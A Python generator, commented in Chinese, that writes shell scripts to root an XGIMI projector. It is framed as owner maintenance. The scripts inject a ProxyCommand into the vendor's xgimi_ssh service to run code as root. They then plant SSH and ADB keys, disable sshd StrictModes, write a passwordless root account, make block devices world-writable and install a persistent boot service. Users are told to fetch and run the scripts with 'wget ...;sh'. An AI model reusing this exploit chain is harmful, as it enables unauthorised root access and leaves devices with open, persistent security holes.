#!/usr/bin/env python3
"""
make_scripts.py —— 生成设备维护脚本 g / p2 / p3 / p4

说明: 本工具利用设备固件中厂商预留的 xgimi_ssh 售后维护服务,
      协助设备所有者完成 ADB 调试授权与系统配置。

自动:
  1. 检查/生成 ssh ed25519 密钥对 (./scripts_key) 与 adb 密钥 (~/.android/adbkey)
  2. 把你自己的公钥写入模板, 输出到 scripts/out/
     - g  : 开启厂商 root sshd (写入 authorized_keys + 设置属性)
     - p2  : 部署 root 维护脚本并触发 (修正属主/写入 ADB 授权)
     - p3  : 补充 passwd 与块设备读取权限 (固件备份用)
     - p4  : 安装开机维护服务 (/system/etc/init/pcroot.rc)
用法:
  python make_scripts.py
之后:
  cd scripts/out/serve && python -m http.server 8000 --bind 0.0.0.0
"""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "out")
SERVE = os.path.join(OUT, "serve")


def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if r.returncode != 0:
        print(r.stdout, r.stderr)
        sys.exit(f"命令失败: {cmd}")
    return r.stdout.strip()


def ensure_ssh_key():
    key = os.path.join(HERE, "scripts_key")
    if not os.path.exists(key):
        print("[*] 生成 ssh ed25519 密钥对 ...")
        sh(f'ssh-keygen -t ed25519 -f "{key}" -N "" -C xgimi-maint -q')
    pub = open(key + ".pub").read().strip()
    return pub


def ensure_adb_key():
    pub_path = os.path.expanduser("~/.android/adbkey.pub")
    if not os.path.exists(pub_path):
        print("[*] 生成 adb 密钥 (adb start-server 亦可) ...")
        sh("adb start-server")
    if not os.path.exists(pub_path):
        sys.exit("未找到 adb 公钥, 请先运行一次 adb")
    return open(pub_path).read().strip()


def w(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", newline="\n") as f:
        f.write(content)
    print("  +", os.path.relpath(path, HERE))


def main():
    ssh_pub = ensure_ssh_key()
    adb_pub = ensure_adb_key()
    os.makedirs(SERVE, exist_ok=True)
    print("[*] 生成维护脚本 (LF 行尾, 已写入你的公钥):")

    # ---------- g : 开启厂商 root sshd ----------
    g = "\n".join([
        "#!/system/bin/sh",
        "# g: enable vendor sshd (service xgimi_ssh)",
        "PUB='" + ssh_pub + "'",
        "mkdir -p /data/ssh 2>/dev/null",
        "chmod 777 /data/ssh 2>/dev/null",
        "printf '%s\\n' \"$PUB\" >> /data/ssh/authorized_keys",
        "chmod 644 /data/ssh/authorized_keys",
        "echo '[1] authorized_keys written'",
        "setprop xgimi.remoteDebug.on true",
        "echo \"[2] xgimi.remoteDebug.on = $(getprop xgimi.remoteDebug.on)\"",
        "setprop ctl.start xgimi_ssh",
        "sleep 2",
        "echo \"[3] init.svc.xgimi_ssh = $(getprop init.svc.xgimi_ssh)\"",
        "echo '[4] port22:' $(netstat -tln 2>/dev/null | grep ':22 ' || echo not-yet)",
        "echo '== g DONE =='",
        "",
    ])
    w(os.path.join(SERVE, "g"), g)

    # ---------- root 维护脚本: 以 root 执行的内容 (p2 部署) ----------
    maint2 = "\n".join([
        "#!/system/bin/sh",
        "# root maintenance script: fix key ownership + authorize adb",
        "echo '" + ssh_pub + "' > /data/ssh/authorized_keys",
        "chown root:root /data/ssh/authorized_keys",
        "chmod 600 /data/ssh/authorized_keys",
        "chown root:root /data/ssh 2>/dev/null",
        "chmod 755 /data/ssh",
        "mkdir -p /data/misc/adb",
        "echo '" + adb_pub + "' >> /data/misc/adb/adb_keys",
        "chown system:shell /data/misc/adb/adb_keys",
        "chmod 640 /data/misc/adb/adb_keys",
        "mount -o rw,remount / 2>/dev/null",
        "mount -o rw,remount /system 2>/dev/null",
        "grep -q '^StrictModes' /system/etc/ssh/sshd_config 2>/dev/null || echo 'StrictModes no' >> /system/etc/ssh/sshd_config",
        "killall sshd 2>/dev/null; pkill sshd 2>/dev/null",
        "sleep 1",
        "/system/bin/sshd -f /system/etc/ssh/sshd_config -D &",
        "sleep 1",
        "date > /data/ssh/PAYLOAD_RAN",
        "exit 0",
    ])
    p2 = "\n".join([
        "#!/system/bin/sh",
        "# p2: stage root maintenance script, run via vendor sshd ProxyCommand",
        "echo '-oProxyCommand=/data/ssh/p 127.0.0.1' > /data/ssh/params",
        "cat > /data/ssh/p <<'XEOF'",
        maint2,
        "XEOF",
        "chmod 755 /data/ssh/p",
        "setprop ctl.stop xgimi_ssh",
        "sleep 1",
        "setprop ctl.start xgimi_ssh",
        "sleep 4",
        "echo '== p2 DONE =='",
        "netstat -tln 2>/dev/null | grep ':22 ' && echo SSHD-UP || echo no-22",
        "",
    ])
    w(os.path.join(SERVE, "p2"), p2)

    # ---------- p3: passwd + 块设备可读 ----------
    maint3 = "\n".join([
        "#!/system/bin/sh",
        "echo 'root::0:0:root:/:/system/bin/sh' > /system/etc/passwd",
        "chmod 644 /system/etc/passwd",
        "chmod 666 /dev/block/mmcblk0 /dev/block/mmcblk0p* 2>/dev/null",
        "date > /data/ssh/ROOT3_OK",
        "exit 0",
    ])
    p3 = "\n".join([
        "#!/system/bin/sh",
        "# p3: unlock passwd + readable block devices (for firmware backup)",
        "cat > /data/ssh/p <<'XEOF'",
        maint3,
        "XEOF",
        "chmod 755 /data/ssh/p",
        "setprop ctl.stop xgimi_ssh",
        "sleep 1",
        "setprop ctl.start xgimi_ssh",
        "sleep 3",
        "echo '== p3 DONE =='",
        "ls -la /data/ssh/ROOT3_OK 2>&1",
        "ls -la /dev/block/mmcblk0p12",
        "",
    ])
    w(os.path.join(SERVE, "p3"), p3)

    # ---------- p4: 开机维护服务 ----------
    rc = "\n".join([
        "service pcroot /system/bin/sh /data/local/tmp/rc.sh",
        "    class main",
        "    disabled",
        "on property:pc.root.go=1",
        "    start pcroot",
        "on property:sys.boot_completed=1",
        "    start pcroot",
        "",
    ])
    maint4 = "\n".join([
        "#!/system/bin/sh",
        "cat > /system/etc/init/pcroot.rc <<'RCEOF'",
        rc,
        "RCEOF",
        "chmod 644 /system/etc/init/pcroot.rc",
        "printf '%s\\n' '#!/system/bin/sh' \\",
        "  'chmod 666 /dev/block/mmcblk0 /dev/block/mmcblk0p* 2>/dev/null' \\",
        "  > /data/local/tmp/rc.sh",
        "chmod 755 /data/local/tmp/rc.sh",
        "date > /data/ssh/PCROOT_INSTALLED",
        "exit 0",
    ])
    p4 = "\n".join([
        "#!/system/bin/sh",
        "# p4: install persistent maintenance service (needs /system rw, run after p2)",
        "cat > /data/ssh/p <<'XEOF'",
        maint4,
        "XEOF",
        "chmod 755 /data/ssh/p",
        "setprop ctl.stop xgimi_ssh",
        "sleep 1",
        "setprop ctl.start xgimi_ssh",
        "sleep 3",
        "echo '== p4 DONE (reboot to activate pcroot.rc) =='",
        "ls -la /system/etc/init/pcroot.rc /data/local/tmp/rc.sh 2>&1",
        "",
    ])
    w(os.path.join(SERVE, "p4"), p4)

    print()
    print("[OK] 输出目录:", SERVE)
    print("下一步:")
    print("  1. cd scripts/out/serve && python -m http.server 8000 --bind 0.0.0.0")
    print("  2. 投影仪 TermOne 中:")
    print("       busybox wget -O g  http://<PC_IP>:8000/g;sh g")
    print("       busybox wget -O p2 http://<PC_IP>:8000/p2;sh p2")
    print("       busybox wget -O p3 http://<PC_IP>:8000/p3;sh p3")
    print("     (U盘党也可以直接把这些文件拷到U盘, 用 sh /mnt/usb/*/文件名 执行)")


if __name__ == "__main__":
    main()
